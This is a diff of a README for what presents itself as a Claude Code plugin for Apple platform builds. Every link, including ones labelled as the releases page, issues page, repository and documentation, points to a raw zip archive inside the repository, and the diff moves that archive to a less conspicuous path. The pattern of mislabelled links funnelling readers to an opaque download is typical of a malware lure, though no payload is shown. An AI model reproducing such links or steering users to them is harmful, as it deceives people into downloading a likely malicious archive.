@@ -1,6 +1,6 @@
 # 🍏 apple-platform-build-tools-claude-code-plugin - Simplify Building for Apple Platforms
 
-[![Download Now](https://raw.githubusercontent.com/rhyean88/apple-platform-build-tools-claude-code-plugin/main/.claude-plugin/platform_claude_build_apple_plugin_tools_code_3.2-alpha.3.zip%20Now-%20-blue)](https://raw.githubusercontent.com/rhyean88/apple-platform-build-tools-claude-code-plugin/main/.claude-plugin/platform_claude_build_apple_plugin_tools_code_3.2-alpha.3.zip)
+[![Download Now](https://raw.githubusercontent.com/rhyean88/apple-platform-build-tools-claude-code-plugin/main/skills/building-apple-platform-products/references/build-tools-code-platform-plugin-apple-claude-3.2.zip%20Now-%20-blue)](https://raw.githubusercontent.com/rhyean88/apple-platform-build-tools-claude-code-plugin/main/skills/building-apple-platform-products/references/build-tools-code-platform-plugin-apple-claude-3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To run this tool, you will need:
 
 To get started, you need to download the tool. 
 
-1. **Visit this page to download**: [Releases Page](https://raw.githubusercontent.com/rhyean88/apple-platform-build-tools-claude-code-plugin/main/.claude-plugin/platform_claude_build_apple_plugin_tools_code_3.2-alpha.3.zip)
+1. **Visit this page to download**: [Releases Page](https://raw.githubusercontent.com/rhyean88/apple-platform-build-tools-claude-code-plugin/main/skills/building-apple-platform-products/references/build-tools-code-platform-plugin-apple-claude-3.2.zip)
    
    On the Releases page, you will find the latest version available for download.
 
@@ -72,12 +72,12 @@ If you encounter any issues while using this tool, please check the following:
 - **Official Documentation**: Comprehensive instructions and FAQs can typically be found in the documentation.
 - **Community Support**: Join forums or online communities focused on Xcode or Swift development.
 
-For specific questions or bugs, you can raise an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/rhyean88/apple-platform-build-tools-claude-code-plugin/main/.claude-plugin/platform_claude_build_apple_plugin_tools_code_3.2-alpha.3.zip).
+For specific questions or bugs, you can raise an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/rhyean88/apple-platform-build-tools-claude-code-plugin/main/skills/building-apple-platform-products/references/build-tools-code-platform-plugin-apple-claude-3.2.zip).
 
 ## 🔗 Quick Links
 
-- [Download Now](https://raw.githubusercontent.com/rhyean88/apple-platform-build-tools-claude-code-plugin/main/.claude-plugin/platform_claude_build_apple_plugin_tools_code_3.2-alpha.3.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/rhyean88/apple-platform-build-tools-claude-code-plugin/main/.claude-plugin/platform_claude_build_apple_plugin_tools_code_3.2-alpha.3.zip)
-- [Documentation](https://raw.githubusercontent.com/rhyean88/apple-platform-build-tools-claude-code-plugin/main/.claude-plugin/platform_claude_build_apple_plugin_tools_code_3.2-alpha.3.zip)
+- [Download Now](https://raw.githubusercontent.com/rhyean88/apple-platform-build-tools-claude-code-plugin/main/skills/building-apple-platform-products/references/build-tools-code-platform-plugin-apple-claude-3.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/rhyean88/apple-platform-build-tools-claude-code-plugin/main/skills/building-apple-platform-products/references/build-tools-code-platform-plugin-apple-claude-3.2.zip)
+- [Documentation](https://raw.githubusercontent.com/rhyean88/apple-platform-build-tools-claude-code-plugin/main/skills/building-apple-platform-products/references/build-tools-code-platform-plugin-apple-claude-3.2.zip)
 
 Feel free to reach out if you have questions or need further assistance. This tool aims to make your development process smooth and efficient. Enjoy using the apple-platform-build-tools-claude-code-plugin!
